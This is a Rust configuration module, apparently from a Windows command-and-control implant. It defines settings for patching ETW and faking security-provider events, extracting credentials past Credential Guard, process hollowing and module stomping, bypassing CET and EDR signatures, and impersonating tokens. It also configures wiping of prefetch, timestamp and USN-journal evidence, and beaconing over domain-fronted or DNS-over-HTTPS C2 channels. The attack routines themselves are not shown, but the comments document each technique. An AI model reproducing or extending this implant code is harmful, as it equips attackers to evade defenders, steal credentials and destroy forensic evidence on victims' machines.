use crate::normalized_transport::TrafficProfile;
use std::path::PathBuf;

/// ETW bypass strategy for Windows targets.
///
/// `Direct` (the default) overwrites the entry point of `EtwEventWrite`,
/// `EtwEventWriteEx`, and `NtTraceEvent` with a `ret` instruction.  No debug
/// registers are consumed and there is no exception-handler overhead.
///
/// `Hwbp` uses hardware breakpoints (Dr0–Dr3) via a vectored exception handler,
/// which is the approach implemented in `evasion::setup_hardware_breakpoints`.
/// Both methods may be active simultaneously: `Hwbp` remains the fallback when
/// `VirtualProtect` is blocked by CFG or other policy.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum EtwPatchMethod {
    #[default]
    Direct,
    Hwbp,
}

/// Controls when the direct-patch ETW bypass is applied relative to the
/// current Windows build number.
///
/// | Variant  | Behaviour |
/// |----------|---------- |
/// | `Safe`   | **Default.** Skip the patch on Windows 11 24H2 (build ≥ 26100) and later, where PatchGuard may detect ETW modifications and trigger a BSOD. |
/// | `Always` | Apply the patch regardless of build number. Useful in controlled test environments where PatchGuard is disabled. |
/// | `Never`  | Never apply the direct-patch bypass. Use when relying solely on the HWBP method or when ETW patching is undesirable. |
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum EtwPatchMode {
    /// Skip the patch on Windows builds ≥ 26100 (Win 11 24H2+).
    #[default]
    Safe,
    /// Always apply the patch, regardless of build number.
    Always,
    /// Never apply the direct-patch bypass.
    Never,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum ExecStrategy {
    #[default]
    Indirect,
    Direct,
    Fallback,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum SleepMethod {
    Ekko,
    Foliage,
    /// Cronus-style waitable-timer sleep using NtSetTimer instead of
    /// NtDelayExecution.  Less commonly hooked by EDR.
    Cronus,
    #[default]
    Standard,
}

/// Encryption scheme used for sleep-mask in-memory encryption.
///
/// Rotation between schemes defeats forensic signatures that target a
/// specific ciphertext structure (e.g. XChaCha20-Poly1305's 24-byte nonce
/// + 16-byte tag pattern).
#[derive(
    serde::Serialize, serde::Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default,
)]
#[serde(rename_all = "kebab-case")]
pub enum SleepScheme {
    /// XChaCha20-Poly1305 AEAD (24-byte nonce, 16-byte tag). Default.
    #[default]
    XChaCha20Poly1305,
    /// AES-256-GCM AEAD (12-byte nonce, 16-byte tag).
    Aes256Gcm,
    /// ChaCha20 stream cipher (12-byte nonce, no authentication tag).
    /// Offers the highest throughput but provides **no integrity check** —
    /// tampered regions will silently decrypt to garbage rather than fail.
    ChaCha20,
}

impl SleepScheme {
    /// Parse a scheme name from its config/toml string representation.
    ///
    /// Accepts both kebab-case (`"xchacha20-poly1305"`) and the enum's
    /// `serde(rename_all = "kebab-case")` output.
    pub fn from_config_str(s: &str) -> Option<Self> {
        match s.to_ascii_lowercase().as_str() {
            "xchacha20-poly1305" | "xchacha20poly1305" => Some(Self::XChaCha20Poly1305),
            "aes-256-gcm" | "aes256gcm" => Some(Self::Aes256Gcm),
            "chacha20" => Some(Self::ChaCha20),
            _ => None,
        }
    }

    /// Nonce length in bytes required by this scheme.
    pub const fn nonce_len(&self) -> usize {
        match self {
            Self::XChaCha20Poly1305 => 24,
            Self::Aes256Gcm => 12,
            Self::ChaCha20 => 12,
        }
    }

    /// Authentication tag length in bytes.  `0` for unauthenticated schemes.
    pub const fn tag_len(&self) -> usize {
        match self {
            Self::XChaCha20Poly1305 => 16,
            Self::Aes256Gcm => 16,
            Self::ChaCha20 => 0,
        }
    }

    /// Whether this scheme provides AEAD authentication.
    pub const fn is_authenticated(&self) -> bool {
        self.tag_len() > 0
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct SleepConfig {
    #[serde(default)]
    pub method: SleepMethod,
    #[serde(default = "default_base_interval")]
    pub base_interval_secs: u64,
    #[serde(default = "default_jitter_percent")]
    pub jitter_percent: u32,
    #[serde(default)]
    pub working_hours_start: Option<u32>, // e.g. 9 for 09:00
    #[serde(default)]
    pub working_hours_end: Option<u32>, // e.g. 17 for 17:00
    #[serde(default)]
    pub off_hours_multiplier: Option<f32>,
    /// When `true`, the agent encrypts its `.text` and `.rdata` sections
    /// in-place with a per-sleep ChaCha20 key before sleeping and decrypts
    /// them on wake.  The 32-byte key is kept in a stack-local variable for
    /// the duration of the sleep, preventing memory-scanning tools from
    /// locating it via known global or thread-local offsets.  When `false`,
    /// the current timing-based obfuscated sleep behaviour is preserved.
    #[serde(default)]
    pub sleep_mask_enabled: bool,
    /// Interval in **seconds** between sleep-mask key rotations while the
    /// agent is idle.  Every N seconds the guarded regions are re-encrypted
    /// with a fresh XChaCha20-Poly1305 key so that a long-lived sleep window
    /// does not present a static ciphertext pattern to memory forensics.
    /// A value of `0` (the default) disables in-sleep rotation — the key
    /// generated at `lock()` time is kept for the entire sleep duration.
    /// Recommended production value: 300–600 seconds (5–10 minutes).
    #[serde(default)]
    pub mask_rotation_interval_secs: u64,
    /// Ordered list of encryption schemes to cycle through during sleep-mask
    /// key rotation.  Each rotation event advances to the next scheme in
    /// the list (wrapping around).  When empty or containing only a single
    /// entry, the behaviour is identical to the legacy single-scheme mode.
    ///
    /// Accepted values: `"xchaCha20-poly1305"`, `"aes-256-gcm"`, `"chacha20"`.
    ///
    /// # Backward compatibility
    ///
    /// If this field is omitted or empty, the agent uses
    /// `[XChaCha20Poly1305]` — identical to the pre-rotation behaviour.
    #[serde(default)]
    pub mask_rotation_schemes: Vec<String>,
}

impl SleepConfig {
    /// Resolve `mask_rotation_schemes` into a `Vec<SleepScheme>`.
    ///
    /// - If the list is empty, returns `[XChaCha20Poly1305]` (backward compat).
    /// - Unrecognised strings are logged and skipped.
    /// - If **no** entries parse successfully, falls back to
    ///   `[XChaCha20Poly1305]`.
    pub fn resolved_schemes(&self) -> Vec<SleepScheme> {
        if self.mask_rotation_schemes.is_empty() {
            return vec![SleepScheme::XChaCha20Poly1305];
        }
        let parsed: Vec<SleepScheme> = self
            .mask_rotation_schemes
            .iter()
            .filter_map(|s| {
                let scheme = SleepScheme::from_config_str(s);
                if scheme.is_none() {
                    log::warn!(
                        "sleep-mask: ignoring unrecognised scheme '{}' in \
                         mask_rotation_schemes",
                        s
                    );
                }
                scheme
            })
            .collect();
        if parsed.is_empty() {
            vec![SleepScheme::XChaCha20Poly1305]
        } else {
            parsed
        }
    }
}

fn default_base_interval() -> u64 {
    30
}
fn default_jitter_percent() -> u32 {
    20
}

/// Configuration for the Evanesco continuous-memory-hiding subsystem.
///
/// When the `evanesco` feature is enabled, all enrolled memory pages are
/// kept in an encrypted / `PAGE_NOACCESS` state at all times — not just
/// during sleep.  Per-page RC4 encryption is used for fast frequent
/// encrypt/decrypt cycles, while the existing XChaCha20-Poly1305 sleep
/// encryption continues to handle the full sweep during sleep.
///
/// A background re-encryption thread periodically scans tracked pages and
/// re-encrypts any that have been idle longer than `idle_threshold_ms`.
/// A VEH handler auto-decrypts pages on `STATUS_ACCESS_VIOLATION`.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct EvanescoConfig {
    /// How long (in milliseconds) a decrypted page may remain idle before
    /// the background re-encryption thread encrypts it again.  Lower values
    /// reduce the window of exposure but increase CPU overhead.  Default: 100 ms.
    #[serde(default = "default_evanesco_idle_threshold_ms")]
    pub idle_threshold_ms: u64,
    /// Interval (in milliseconds) between background re-encryption scans.
    /// Each scan checks all tracked pages and re-encrypts those idle beyond
    /// `idle_threshold_ms`.  Default: 50 ms.
    #[serde(default = "default_evanesco_scan_interval_ms")]
    pub scan_interval_ms: u64,
}

fn default_evanesco_idle_threshold_ms() -> u64 {
    100
}
fn default_evanesco_scan_interval_ms() -> u64 {
    50
}
fn default_browser_c4_timeout_secs() -> u64 {
    60
}

// ── LSA Whisperer configuration ──────────────────────────────────────────

/// Configuration for the LSA Whisperer credential extraction module.
///
/// LSA Whisperer interacts with LSA authentication packages (SSPs) through
/// their documented interfaces, operating entirely within the LSA process's
/// own security context without needing to read LSASS memory at all.
/// This bypasses Credential Guard and RunAsPPL.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "kebab-case")]
pub struct LsaWhispererConfig {
    /// Maximum time (in seconds) to wait for the untrusted LSA enumeration
    /// to complete.  Default: 30 s.
    #[serde(default = "default_lsa_whisperer_timeout_secs")]
    pub timeout_secs: u64,
    /// Maximum number of credentials to buffer when using SSP injection
    /// (admin method).  Default: 1024.
    #[serde(default = "default_lsa_whisperer_buffer_size")]
    pub buffer_size: usize,
    /// Whether to automatically attempt SSP injection if running elevated.
    /// Default: true.
    #[serde(default = "default_lsa_whisperer_auto_inject")]
    pub auto_inject: bool,
}

fn default_lsa_whisperer_timeout_secs() -> u64 {
    30
}
fn default_lsa_whisperer_buffer_size() -> usize {
    1024
}
fn default_lsa_whisperer_auto_inject() -> bool {
    true
}

// ── SyscallConfig ───────────────────────────────────────────────────────────

/// Configuration for the indirect dynamic syscall resolution subsystem.
///
/// Controls how often cached SSNs are validated against the live ntdll.
/// Only effective when the agent is compiled with the `direct-syscalls`
/// feature.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct SyscallConfig {
    /// Number of main-loop iterations between periodic SSN cache validations.
    /// Each validation cross-references the ntdll PE timestamp and probes
    /// critical syscalls with invalid parameters.  Default: 100.
    #[serde(default = "default_syscall_validate_interval")]
    pub validate_interval: u32,
}

fn default_syscall_validate_interval() -> u32 {
    100
}

impl Default for SyscallConfig {
    fn default() -> Self {
        Self {
            validate_interval: default_syscall_validate_interval(),
        }
    }
}

// ── EvasionTransformConfig ────────────────────────────────────────────────

/// Configuration for the automated EDR bypass transformation engine.
///
/// Scans the agent's own compiled `.text` section for byte signatures known
/// to be detected by EDR (YARA rules, entropy heuristics, known gadget
/// chains).  When a detected pattern is found, applies semantic-preserving
/// transformations automatically at runtime: instruction substitution,
/// register reassignment, nop-sled insertion, constant splitting, and jump
/// obfuscation.
///
/// Only effective when the agent is compiled with the `evasion-transform`
/// feature (which implies `self-reencode`).
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct EvasionTransformConfig {
    /// Enable periodic automatic EDR bypass transformations.  When `false`,
    /// only on-demand `EvasionTransformScan` / `EvasionTransformRun` commands
    /// are accepted.  Default: `true`.
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Interval in seconds between automatic scan-and-transform cycles.
    /// Each cycle scans `.text` for known signatures and applies up to
    /// `max_transforms_per_cycle` transformations.  Default: 300 s (5 min).
    #[serde(default = "default_evasion_transform_scan_interval")]
    pub scan_interval_secs: u64,
    /// Maximum number of transformations to apply in a single cycle.
    /// Limits the scope of each pass to avoid large `.text` perturbations
    /// that could themselves attract EDR attention.  Default: 12.
    #[serde(default = "default_evasion_transform_max_per_cycle")]
    pub max_transforms_per_cycle: u32,
    /// Shannon entropy threshold above which a `.text` region is flagged as
    /// suspicious (likely encrypted/packed and already evading signature
    /// detection).  Regions above this threshold are *skipped* to avoid
    /// transforming already-safe code.  Range: 0.0–8.0.  Default: 6.8.
    #[serde(default = "default_evasion_transform_entropy_threshold")]
    pub entropy_threshold: f64,
}

fn default_evasion_transform_scan_interval() -> u64 {
    300
}
fn default_evasion_transform_max_per_cycle() -> u32 {
    12
}
fn default_evasion_transform_entropy_threshold() -> f64 {
    6.8
}

impl Default for EvasionTransformConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            scan_interval_secs: default_evasion_transform_scan_interval(),
            max_transforms_per_cycle: default_evasion_transform_max_per_cycle(),
            entropy_threshold: default_evasion_transform_entropy_threshold(),
        }
    }
}

// ── NTFS Transaction-Based Process Hollowing ─────────────────────────────────

/// Configuration for the NTFS transaction-based process hollowing injection
/// variant.  Uses `NtCreateTransaction` + `NtCreateSection` backed by the
/// transaction, writes payload into a suspended target process, then rolls
/// back the transaction so the file on disk never existed while the section
/// mapping in the target remains valid.  Includes ETW blinding: temporarily
/// patches ETW in the target process and emits fake provider events.
///
/// Only effective when compiled with the `transacted-hollowing` feature.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct TransactedHollowingConfig {
    /// Enable the NTFS transaction-based hollowing injection variant.
    /// When `false`, the technique is excluded from auto-selection and
    /// direct invocation returns an error.  Default: `true`.
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Prefer transacted hollowing over standard process hollowing in
    /// auto-selection ranking.  When `true`, transacted hollowing is
    /// ranked above `ProcessHollow` (but below pool-party variants).
    /// Default: `true`.
    #[serde(default = "default_true")]
    pub prefer_over_hollowing: bool,
    /// Enable ETW blinding: temporarily patches `EtwEventWrite` in the
    /// target process and emits 3–5 fake events with Windows Defender /
    /// Sysmon provider GUIDs before restoring.  Default: `true`.
    #[serde(default = "default_true")]
    pub etw_blinding: bool,
    /// Maximum time in milliseconds to wait for the NTFS transaction
    /// rollback to complete before force-closing the transaction handle.
    /// Default: 5000 ms.
    #[serde(default = "default_transacted_rollback_timeout_ms")]
    pub rollback_timeout_ms: u32,
}

fn default_transacted_rollback_timeout_ms() -> u32 {
    5000
}

impl Default for TransactedHollowingConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            prefer_over_hollowing: true,
            etw_blinding: true,
            rollback_timeout_ms: default_transacted_rollback_timeout_ms(),
        }
    }
}

// ── Delayed module-stomp config ─────────────────────────────────────────────

/// Configuration for the delayed module-stomp injection technique.
///
/// This technique loads a sacrificial DLL into the target process, waits
/// for a randomized delay to let EDR initial-scan heuristics pass, then
/// overwrites the DLL's `.text` section with the payload.  Defeats
/// timing-based EDR heuristics that flag modules whose code changes
/// shortly after loading.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct DelayedStompConfig {
    /// Enable the delayed module-stomp injection variant.
    /// When `false`, the technique is excluded from auto-selection and
    /// direct invocation returns an error.  Default: `true`.
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Minimum delay in seconds between DLL load and stomp.
    /// Default: 8 seconds.
    #[serde(default = "default_min_delay_secs")]
    pub min_delay_secs: u32,
    /// Maximum delay in seconds between DLL load and stomp.
    /// Default: 15 seconds.
    #[serde(default = "default_max_delay_secs")]
    pub max_delay_secs: u32,
    /// Ordered list of candidate sacrificial DLLs to load into the target
    /// process.  Must NOT already be loaded in the target.  Earlier entries
    /// are tried first.  The DLL must be present on the target system
    /// (typically in `C:\Windows\System32\`).
    /// Default: curated list of ~30 commonly available, low-visibility DLLs.
    #[serde(default = "default_delayed_stomp_dlls")]
    pub sacrificial_dlls: Vec<String>,
    /// Prefer delayed stomp over standard module stomping in auto-selection.
    /// When `true`, `DelayedModuleStomp` is ranked above `ModuleStomp`.
    /// Default: `true`.
    #[serde(default = "default_true")]
    pub prefer_over_stomp: bool,
}

fn default_min_delay_secs() -> u32 {
    8
}

fn default_max_delay_secs() -> u32 {
    15
}

fn default_delayed_stomp_dlls() -> Vec<String> {
    vec![
        "version.dll".into(),
        "dwmapi.dll".into(),
        "msctf.dll".into(),
        "uxtheme.dll".into(),
        "netprofm.dll".into(),
        "devobj.dll".into(),
        "cryptbase.dll".into(),
        "wer.dll".into(),
        "msimg32.dll".into(),
        "propsys.dll".into(),
        "d3d10.dll".into(),
        "dbgeng.dll".into(),
        "dbghelp.dll".into(),
        "winnsi.dll".into(),
        "iphlpapi.dll".into(),
        "dnsapi.dll".into(),
        "mpr.dll".into(),
        "credui.dll".into(),
        "winspool.drv".into(),
        "setupapi.dll".into(),
        "cfgmgr32.dll".into(),
        "powrprof.dll".into(),
        "profapi.dll".into(),
        "sspicli.dll".into(),
        "rpcrt4.dll".into(),
        "bcrypt.dll".into(),
        "bcryptprimitives.dll".into(),
        "msvcrt.dll".into(),
        "ucrtbase.dll".into(),
        "sechost.dll".into(),
    ]
}

impl Default for DelayedStompConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            min_delay_secs: default_min_delay_secs(),
            max_delay_secs: default_max_delay_secs(),
            sacrificial_dlls: default_delayed_stomp_dlls(),
            prefer_over_stomp: true,
        }
    }
}

// ── SyscallEmulationConfig ────────────────────────────────────────────────

/// Configuration for user-mode NT kernel interface emulation.
///
/// Implements frequently-used NT syscalls ENTIRELY in user-mode Rust code via
/// kernel32/advapi32 fallbacks, eliminating ALL references to ntdll.dll syscall
/// stubs.  This makes the agent invisible to EDR hooks on ntdll AND to ntdll
/// unhooking detection.  When the kernel32 fallback is unavailable or fails,
/// the existing indirect syscall path in `syscalls.rs` is used as a fallback.
///
/// Call stack consistency: when using kernel32 fallbacks, the call stack shows
/// `kernel32!WriteProcessMemory` etc. — BENEFICIAL as it looks like legitimate
/// API usage.
///
/// Only effective when compiled with the `syscall-emulation` feature
/// (which implies `direct-syscalls`).  Windows-only.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct SyscallEmulationConfig {
    /// Enable user-mode syscall emulation globally.  When `false`, all
    /// calls go through the existing indirect syscall path.  Default: `true`.
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Prefer kernel32/advapi32 equivalents over indirect syscalls.
    /// When `true`, the emulation layer is tried first for all configured
    /// functions.  Default: `true`.
    #[serde(default = "default_true")]
    pub prefer_kernel32: bool,
    /// Fall back to the existing indirect syscall path when the kernel32
    /// equivalent fails.  When `false`, a kernel32 failure is propagated
    /// immediately without attempting indirect syscalls.  Default: `true`.
    #[serde(default = "default_true")]
    pub fallback_to_indirect: bool,
    /// List of Nt function names to emulate via kernel32 fallbacks.
    /// Only these functions will be routed through the emulation layer;
    /// all others go through the existing indirect syscall path unchanged.
    /// Default: six most commonly used functions for injection and memory ops.
    #[serde(default = "default_emulated_functions")]
    pub emulated_functions: Vec<String>,
}

fn default_emulated_functions() -> Vec<String> {
    vec![
        "NtWriteVirtualMemory".into(),
        "NtReadVirtualMemory".into(),
        "NtAllocateVirtualMemory".into(),
        "NtProtectVirtualMemory".into(),
        "NtOpenProcess".into(),
        "NtClose".into(),
    ]
}

impl Default for SyscallEmulationConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            prefer_kernel32: true,
            fallback_to_indirect: true,
            emulated_functions: default_emulated_functions(),
        }
    }
}

// ── CetBypassConfig ──────────────────────────────────────────────────────

/// Configuration for CET (Control-flow Enforcement Technology) / Shadow
/// Stack bypass.
///
/// Windows 11 24H2+ enables kernel-mode hardware-enforced shadow stacks by
/// default.  CET maintains a separate "shadow stack" that records return
/// addresses — if a `ret` instruction's target doesn't match the shadow
/// stack entry, a #CP (Control Protection) exception fires.  This defeats
/// ROP, stack pivoting, and return-address spoofing.
///
/// Three bypass strategies are available:
///
/// 1. **Policy disable** (preferred): Use `NtSetInformationProcess` with
///    `ProcessMitigationPolicy` to disable CET shadow stacks for the target
///    process (and the agent itself, if needed).
///
/// 2. **CET-compatible call chain**: Build legitimate call chains through
///    ntdll/kernel32 functions so each `call` pushes a valid entry onto both
///    the regular and shadow stacks.  Used when CET cannot be disabled via
///    policy (insufficient privileges).
///
/// 3. **VEH shadow stack fix** (experimental): Register a VEH handler that
///    intercepts #CP exceptions and adjusts the shadow stack entry.  Requires
///    kernel access (BYOVD) to read/write KTHREAD shadow stack pointer.
///
/// Only effective when compiled with the `cet-bypass` feature (which implies
/// `direct-syscalls`).  Windows-only.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct CetBypassConfig {
    /// Enable CET/shadow-stack bypass globally.  When `false`, all call-stack
    /// spoofing proceeds without CET awareness (will crash if CET is active).
    /// Default: `true`.
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Prefer disabling CET via process mitigation policy before attempting
    /// operations that manipulate return addresses.  Default: `true`.
    #[serde(default = "default_true")]
    pub prefer_policy_disable: bool,
    /// Fall back to the CET-compatible call-chain approach when CET cannot be
    /// disabled via policy (e.g. insufficient privileges).  When `false` and
    /// policy disable fails, the operation is aborted.  Default: `true`.
    #[serde(default = "default_true")]
    pub fallback_to_call_chain: bool,
    /// Enable the experimental VEH-based shadow stack fix.  Requires kernel
    /// access (BYOVD via `kernel-callback` feature) to manipulate KTHREAD
    /// shadow stack pointers.  Default: `false` (too risky without kernel).
    #[serde(default)]
    pub veh_shadow_fix: bool,
}

impl Default for CetBypassConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            prefer_policy_disable: true,
            fallback_to_call_chain: true,
            veh_shadow_fix: false,
        }
    }
}

// ── TokenImpersonationConfig ─────────────────────────────────────────────

/// Configuration for token-only impersonation via NtImpersonateThread /
/// SetThreadToken.  Avoids calling `ImpersonateNamedPipeClient` directly on
/// the main agent thread, which is heavily signatured by EDR products.
///
/// Two bypass strategies are available:
///
/// 1. **Impersonation thread**: Create a helper thread that calls
///    `ConnectNamedPipe` + `ImpersonateNamedPipeClient`, then extract the
///    impersonation token via `NtOpenThreadToken` and apply it to the main
///    thread via `NtSetInformationThread(ThreadImpersonationToken)`.  The
///    main thread never calls any impersonation API — EDR monitoring sees
///    only `NtSetInformationThread` (a lower-level NT API).
///
/// 2. **SetThreadToken**: Use `DuplicateTokenEx` on the connected client's
///    token, then call `SetThreadToken(NULL, duplicated_token)` on the
///    current thread.  This is even more direct — `SetThreadToken` is a
///    lower-level API that fewer EDR products monitor.
///
/// Token cache: Duplicated tokens are stored in an encrypted HashMap keyed
/// by source (pipe name / PID).  Tokens are automatically reverted when a
/// task completes (configurable via `auto_revert_on_task_complete`).
///
/// Only effective when compiled with the `token-impersonation` feature.
/// Windows-only.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct TokenImpersonationConfig {
    /// Enable token-only impersonation globally.  When `false`, any existing
    /// named pipe impersonation (e.g. `ImpersonateNamedPipeClient`) is used
    /// unchanged.  Default: `true`.
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Prefer `SetThreadToken` over the impersonation-thread approach.
    /// `SetThreadToken` is more direct (single API call) but fewer EDRs
    /// monitor it, making it the preferred strategy.  Default: `true`.
    #[serde(default = "default_true")]
    pub prefer_set_thread_token: bool,
    /// Cache duplicated tokens for reuse across multiple operations.  Tokens
    /// are stored encrypted at rest via `memory_guard`.  Default: `true`.
    #[serde(default = "default_true")]
    pub cache_tokens: bool,
    /// Automatically revert the impersonation token when a C2 task handler
    /// returns.  When `false`, the token remains active until explicitly
    /// reverted via `RevertToken` command.  Default: `true`.
    #[serde(default = "default_true")]
    pub auto_revert_on_task_complete: bool,
}

impl Default for TokenImpersonationConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            prefer_set_thread_token: true,
            cache_tokens: true,
            auto_revert_on_task_complete: true,
        }
    }
}

// ── PrefetchConfig ────────────────────────────────────────────────────────

/// Cleanup method for Windows Prefetch evidence.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum PrefetchCleanMethod {
    /// Delete the .pf file via NtDeleteFile.
    Delete,
    /// Patch the .pf header in-place: zero run count, timestamps, strings.
    /// Preferred — file remains but contains no useful forensic data.
    #[default]
    Patch,
    /// Disable the Prefetch service before the operation, restore after.
    DisableService,
}

/// Configuration for Windows Prefetch evidence removal.
///
/// Windows stores .pf files in `C:\Windows\Prefetch\` that record process
/// execution evidence (executable name, run count, timestamps, loaded DLLs,
/// directories accessed).  EDR and forensic tools parse these to build
/// execution timelines.  This subsystem removes or sanitises .pf evidence
/// after injection or on-demand.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct PrefetchConfig {
    /// Enable prefetch evidence cleanup.
    #[serde(default = "default_true")]
    pub enabled: bool,

    /// Automatically clean prefetch evidence after injection completes.
    #[serde(default = "default_true")]
    pub auto_clean_after_injection: bool,

    /// Cleanup method: "delete", "patch" (preferred), or "disable-service".
    #[serde(default)]
    pub method: PrefetchCleanMethod,

    /// Restore the Prefetch service to its original state after disabling.
    /// Only applies when method is "disable-service".
    #[serde(default = "default_true")]
    pub restore_service_after: bool,

    /// Clean USN journal entries referencing the .pf file after
    /// modification/deletion to prevent forensic timeline analysis.
    #[serde(default = "default_true")]
    pub clean_usn_journal: bool,
}

impl Default for PrefetchConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            auto_clean_after_injection: true,
            method: PrefetchCleanMethod::default(),
            restore_service_after: true,
            clean_usn_journal: true,
        }
    }
}

// ── TimestampConfig ──────────────────────────────────────────────────────

/// Default reference file for cover timestamps.  `ntdll.dll` is present on
/// every Windows system and is accessed frequently, making its timestamps
/// a natural-looking cover.
fn default_reference_file() -> String {
    r"C:\Windows\System32\ntdll.dll".to_string()
}

/// Configuration for MFT timestamp synchronization and USN journal cleanup.
///
/// NTFS stores file timestamps in TWO MFT attributes: `$STANDARD_INFORMATION`
/// ($SI) and `$FILE_NAME` ($FN).  Most forensic tools compare both — if $SI
/// is modified but $FN isn't (or vice versa), it indicates timestomping.
/// This subsystem synchronises both attributes plus cleans USN journal
/// entries to prevent forensic timeline analysis of file operations.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct TimestampConfig {
    /// Enable timestamp synchronisation and USN journal cleanup.
    #[serde(default = "default_true")]
    pub enabled: bool,

    /// Synchronise both $SI and $FN timestamps.  If false, only $SI is
    /// modified (NtSetInformationFile with FileBasicInformation) — simpler
    /// but detectable by tools that compare $SI vs $FN.
    #[serde(default = "default_true")]
    pub sync_si_and_fn: bool,

    /// Clean USN journal entries referencing modified files after
    /// timestamp manipulation to prevent forensic timeline recovery.
    #[serde(default = "default_true")]
    pub usn_cleanup: bool,

    /// Truncate $LogFile entries referencing timestamp changes.
    /// **Dangerous** — may cause NTFS corruption if the system crashes
    /// during the operation.  Defaults to false (safe: let entries age
    /// out naturally from the circular log).
    #[serde(default)]
    pub logfile_cleanup: bool,

    /// Path to a reference file whose timestamps will be used as the
    /// "cover time" for timestomping.  The reference file should be a
    /// commonly-accessed system file (e.g. `ntdll.dll`, `kernel32.dll`)
    /// so that the timestamps blend in with normal system activity.
    #[serde(default = "default_reference_file")]
    pub reference_file: String,

    /// Automatically clean timestamps after file operations (file drops,
    /// DLL stomping, config writes) to prevent forensic detection.
    #[serde(default = "default_true")]
    pub auto_clean_after_file_ops: bool,
}

impl Default for TimestampConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            sync_si_and_fn: true,
            usn_cleanup: true,
            logfile_cleanup: false,
            reference_file: default_reference_file(),
            auto_clean_after_file_ops: true,
        }
    }
}

impl Default for LsaWhispererConfig {
    fn default() -> Self {
        Self {
            timeout_secs: default_lsa_whisperer_timeout_secs(),
            buffer_size: default_lsa_whisperer_buffer_size(),
            auto_inject: default_lsa_whisperer_auto_inject(),
        }
    }
}

impl Default for EvanescoConfig {
    fn default() -> Self {
        Self {
            idle_threshold_ms: default_evanesco_idle_threshold_ms(),
            scan_interval_ms: default_evanesco_scan_interval_ms(),
        }
    }
}

impl Default for SleepConfig {
    fn default() -> Self {
        Self {
            method: SleepMethod::Standard,
            base_interval_secs: default_base_interval(),
            jitter_percent: default_jitter_percent(),
            working_hours_start: None,
            working_hours_end: None,
            off_hours_multiplier: None,
            sleep_mask_enabled: false,
            mask_rotation_interval_secs: 0,
            mask_rotation_schemes: Vec::new(),
        }
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub struct MalleableProfile {
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_uri")]
    pub uri: String,
    #[serde(default = "default_host_header")]
    pub host_header: String,
    #[serde(default)]
    pub cdn_relay: bool,
    #[serde(default)]
    pub dns_over_https: bool,
    /// Direct C2 endpoint used when `cdn_relay` is false.
    /// Must be set to a real HTTPS URL (e.g., "https://c2.example.com") for
    /// non-CDN deployments.  Defaults to empty string; the agent will error
    /// at startup if this is empty and cdn_relay is false.
    #[serde(default)]
    pub direct_c2_endpoint: String,
    /// IP address returned by the C2 DNS server to signal that tasking is
    /// available.  Defaults to "1.2.3.4"; override per server so that
    /// multiple deployments can use different sentinels to avoid fingerprinting.
    #[serde(default = "default_doh_beacon_sentinel")]
    pub doh_beacon_sentinel: String,
    /// URL of the server-side DNS-to-C2 bridge that receives the DoH queries
    /// and routes them to the agent session.  **Required** when
    /// `dns_over_https = true`; the agent will refuse to activate the DoH
    /// transport if this field is absent or empty.  Example:
    /// `"https://c2.example.com/doh-bridge"`.
    #[serde(default)]
    pub doh_server_url: Option<String>,
    /// CDN relay endpoint for domain fronting.  The TCP connection goes here;
    /// the Host header carries the actual C2 domain.  Required when
    /// `cdn_relay = true`; the agent will bail at startup if this is empty
    /// and cdn_relay is enabled.  Example: `"cdn-provider.example.com"`.
    #[serde(default)]
    pub cdn_endpoint: String,
    /// Optional kill date in `YYYY-MM-DD` format (UTC).  When set, the agent
    /// will refuse to connect after this date.  Leave empty to disable.
    #[serde(default)]
    pub kill_date: String,
    /// Optional cloud instance identifier allowlist entry.  When set and the
    /// host IMDS instance-id matches this value, `refuse_in_vm` enforcement is
    /// bypassed for this trusted cloud VM.
    #[serde(default)]
    pub cloud_instance_id: Option<String>,
